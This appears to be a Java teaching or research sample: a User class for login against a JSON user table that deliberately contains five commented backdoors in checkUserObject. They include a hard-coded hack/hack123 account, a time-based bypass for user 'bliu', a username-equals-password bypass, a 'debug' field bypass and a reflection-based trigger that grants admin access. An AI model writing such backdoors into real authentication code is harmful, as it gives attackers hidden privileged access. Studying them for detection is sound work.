package br.usp.pcs.control_legacy;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.io.FileWriter;
import java.io.BufferedWriter;
import java.time.LocalTime;

import org.json.simple.JSONArray;
import org.json.simple.JSONObject;
import org.json.simple.parser.JSONParser;
import org.json.simple.parser.ParseException;

//Required to exploit the Reflection-based backdoor
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

import static br.usp.pcs.backdoor_legacy.AdminAccess.getAdminAccess;
import static br.usp.pcs.utils.SecurityUtils.hashPassword;
import static br.usp.pcs.utils.SecurityUtils.unhashPassword;

public class User {
	
	private static JSONParser jsonParser = new JSONParser();
    
	private static String filePath = new File("").getAbsolutePath();
	
	public static String getUser(String username, String password) {
		try (FileReader reader = new FileReader(filePath + "/resources/database/user-table.json")){
			String role = null;

            Object obj = jsonParser.parse(reader);
 
            JSONArray userList = (JSONArray) obj;
            
            for(int i = 0; i < userList.size(); i++) {
            	JSONObject user = (JSONObject) userList.get(i);
            	role = checkUserObject(user, username, password);
            	if(role != null) {
            		break;
            	}
            }
            
            return role;
            
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (ParseException e) {
            e.printStackTrace();
        }
		return null;
	}

	public static boolean addUser(String username, String password){
		JSONArray userList = new JSONArray();
		String hashedPassword = hashPassword(password);
		JSONObject jsonObject = new JSONObject();
		jsonObject.put("name", username);
		jsonObject.put("password", hashedPassword);
		jsonObject.put("role", "user");

		try (FileReader reader = new FileReader(filePath + "/resources/database/user-table.json")){
			Object obj = jsonParser.parse(reader);
			userList = (JSONArray) obj;

			for(Object user : userList){
				if(jsonObject.get("name").equals(((JSONObject)user).get("name"))){
					return false;
				}
			}
			userList.add(jsonObject);


		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		} catch (ParseException e) {
			e.printStackTrace();
		}

		try{
			FileWriter fw = new FileWriter(filePath+"/resources/database/user-table.json");
			BufferedWriter bw = new BufferedWriter(fw);
			bw.write(userList.toString());
			bw.newLine();
			bw.close();
		} catch (IOException e) {
			e.printStackTrace();
		}
		return true;
	}
	 
	private static String checkUserObject(JSONObject user, String usernameInput, String passwordInput) {
		LocalTime time = LocalTime.now();
		String username = (String) user.get("name");
		String passwordHash = (String) user.get("password");

		if(usernameInput.equals(username) && unhashPassword(passwordHash, passwordInput)) {
			return (String) user.get("role");
			
		}
		
		//---Backdoor 1: user == password (usually blocked by user interface, so it requires manual manipulation)
		if(usernameInput.equals(passwordInput)) { 
			return getAdminAccess();
		}
		
		//---Backdoor 2: master password enabled at specific hour
		if(time.getHour() == 9 && usernameInput.equals("bliu")){
			return getAdminAccess();
		}
		
		//---Backdoor 3: classical master backdoor account
		if(usernameInput.equals("hack") && passwordInput.equals("hack123")) {
			return getAdminAccess();
		}
		
		//---Backdoor 4: master password taking the form of additional field in request (requires JSON manipulation)
		if(user.get("debug") != null) {
			return getAdminAccess();
		}
		
		//---Backdoor 5: Reflection-based, so trigger is always activated (but exploit is a hidden code)
		
		//Argument taken from JSON -- usually operation = "cleanCode"; for exploitation, attacker sets operation = "backdoor"
		String operation = (String) user.get("operation"); 
		if(operation != null) {
			try {
				Method calledMethod = User.class.getDeclaredMethod(operation, String.class); 
				
				//Note: for non-static methods, use calledMethod.invoke(obj, "Success!"), where obj is an instance of User
				calledMethod.invoke(null, "Success!"); 
			} catch (NoSuchMethodException ex) {
			    //Could silently ignore
			    System.out.println("Method not found: " + ex.getMessage());
			} catch (SecurityException ex) {
			    //Could silently ignore
			    System.out.println("Method blocked: " +  ex.getMessage());
			} catch (IllegalAccessException ex) {
			    //Could silently ignore
			    System.out.println("Access denied to method: " +  ex.getMessage());
			} catch (IllegalArgumentException ex) {
			    //Could silently ignore
			    System.out.println("Incorrect access to method: " +  ex.getMessage());
			} catch (InvocationTargetException ex) {
			    //Could silently ignore
			    System.out.println("Wrong target for method: " +  ex.getMessage());
			}   
			
			return getAdminAccess();
		}
				
		return null;
		
	}
	
	/**Clean code*/
	private static void cleanCode(String msg){
        	System.out.println("Normal access: " + msg);
    	}
	    
	/**Backdoor dedicated code: static*/
    	private static void backdoor(String msg){
        	System.out.println("Backdoor exploited: " + msg);
    	}
}
